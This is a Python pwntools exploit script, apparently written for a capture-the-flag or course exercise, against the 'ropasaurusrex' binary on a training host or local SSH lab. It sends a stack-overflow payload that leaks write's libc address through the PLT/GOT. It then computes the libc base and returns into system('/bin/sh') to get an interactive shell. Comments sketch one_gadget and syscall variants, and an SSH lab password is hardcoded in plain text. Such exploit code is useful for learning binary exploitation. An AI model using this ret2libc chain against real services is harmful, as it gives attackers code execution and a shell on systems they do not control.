from pwn import *
from getpass import *
import logging
import time
#context(log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


if len(sys.argv)==1:
    #REMOTE EXPLOIT
    site = "training.jinblack.it"
    port = 2014
    libc = ELF("./libc-2.27.so")
    c =  remote(site,port)
    process = ("./ropasaurusrex")
    binary = ELF(process)
else:
    #SSH EXPLOIT : PLEASE NOTE IT IS NOT POSSIBLE TO USE GDB.DEBUG THROUGH SSH USE GDB.ATTACH
    host = "acidburn"

    ip = "127.0.0.1"

    category = "rop"
    proc = "ropasaurusrex"
    #path = "/challenges/rop/ropasaurusrex/"
    path = "/challenges/"+category+"/"+proc+"/"
    #prt = int(input(" insert "+host+"'s port to connect to:"))
    prt = 3022

    #pwd = getpass("insert "+host+"'s password:")
    pwd = "0607991337"

    print("Connecting to "+host+" at "+ip+" to execute syscall")
    ssh_p = ssh(host,ip,password=pwd,port= prt)

    process = "."+path+proc
    c = ssh_p.process(process)
    #r= gdb.attach(c,gdbscript ='''b *0x0804841c
    #                              continue
    #                           ''')
    binary = c.elf
    libc = c.libc


        #p32(..) convert to a sequence of 32bit

#what_to_write = binary.got["write"] obtain automatically the GOT table address of write
#where_to_jump = binary.plt["write"] obtain automaticcally the PLT table to get address of a call to write
#payload = b"A"*136 #fill the buffer
#payload += b"BBBB" #EBP
#payload += p32(where_to_jump) #sEIP
#payload += b"CCCC" #return address seen when retting from where to jump
#payload += p32(1)
#payload += p32(what_to_write)
#payload += p32(4)

#r.sendline(payload)
#leak =(r.recv(4))

#write_offset = libc.symbols["write"] #we want the references where the write function is in the libc
#libc_base = leak - write_offset
#print("LIBC base:" + hex(libc_base))
#r.interactive()

#CCCC = binary.symbols["main"]#no symbol name for main instead let's call start
#CCCC = binary.entry

#ref_to_write = 0x0804830c #we have got it after checking for write's references through Preference method
                      #in ghidra's binary
ref_to_write = binary.plt["write"]
#got_write = 0x08049614#addr of write in got
got_write = binary.got["write"]

payload = b"A"*140+p32(ref_to_write)+ p32(binary.entry) + p32(1)+p32(got_write)+p32(4)

#STRUCTURE OF PAYLOAD :
# plt_write : this is the next function to which we'll jump to, it is a call to write
# gadget : the gadget to clean the STACK , then the arguments to put on stack (see man 2 write)
#fd(1 to stdout) ;*buf : we want to write to the got table so we need;count : we only need 4 bytes
input("Press key to leak libc: ")
c.send(payload)

write_libc = u32( c.recv(4))
write_offset = 0x00e6e30
write_offset = libc.symbols["write"]

libc_base = write_libc - write_offset  #we found the second addr through using objdump on ./libc.so.6 |grep write on remote ssh

print("base@libc %#x" % libc_base)
print("write@libc %#x" % write_libc)#these two are the two addresses we want to know

system_libc = libc_base + 0x003d2e0#we found this through objdump on libc.so.6 \grep system
system_libc = libc.symbols["system"]

print("system@libc %#x" % system_libc)#these two are the two addresses we want to know
#to verify this addr on gdb upon terminating exec type x/10i 0xf7e192e0
#BIG PROBLEM I DO NOT HAVE THESE ADDRESSES ON BEFORE SENDING THE PAYLOAD
#INSTEAD OF PLACEHOLDER CCCC for gadget I could put main's address in order to
#RESTART the program and have a second chance at putting a payload now knowing all
#required addresses, I have two ways of obtaining it, manually or via binary.symbols["main"] or binary.entry ù

#3 ways to  exploit
#1. exploit with system
    #we need to get system offset
system_offset = libc.symbols["system"]
#how do we find the bin/sh string ?
#load libc on ghidra and check it there OR
# use ida64 , it is @.rodata , pls use rem ote lib that you are given via ldd
bin_sh_offset = 0x0192352
#or you can do it automatically via
bin_sh_offset = next(libc.search(b"/bin/sh"))

payload = b"A"*136 +b"BBBB" #buffer + ebp
payload += p32(libc_base + system_offset)#EIP address of system
payload += b"CCCC"# why is this guy fine ?
payload += p32(libc_base + bin_sh_offset)

c.sendline(payload)

#or you can do it
#2. one gadget                             (PLS TAKE CARE OF CONSTRAINTS !!!)
#  >$ one_gadget libc-2,31.so
#    -must satisfy constraints
#      1.. ebp is the GOT address of libc
#      how do we get GOT addr of libc?
#  >$ readelf -a libc-2.31.so
#      .. trace back .got.plt in section headers, pick first offset after PROGBITS
#
#      payload = b"A"*136
#      payload += p32(libc_base + 0x1eb000) #satisfies EBP constraint
#      payload += p32(libc_base + 0x1487fc) #EIP

#      2.. [esp]  == NULL ,translation : the stack pointer should be set POINTING to a NULL value
#
#      #payload += b"\x00"*4 #NULL that esp will point to


#3.build a "shellcode" , make a syscall and prepare the stack for the syscall

# using facutly.nps.edu/cseagle/assembly/sys_call.html to check register contents
#
#(We'll do it in a 64 bit fashion because it would complicate things a bit in 32 bits)

#prepare 4 registers
#

c.interactive()
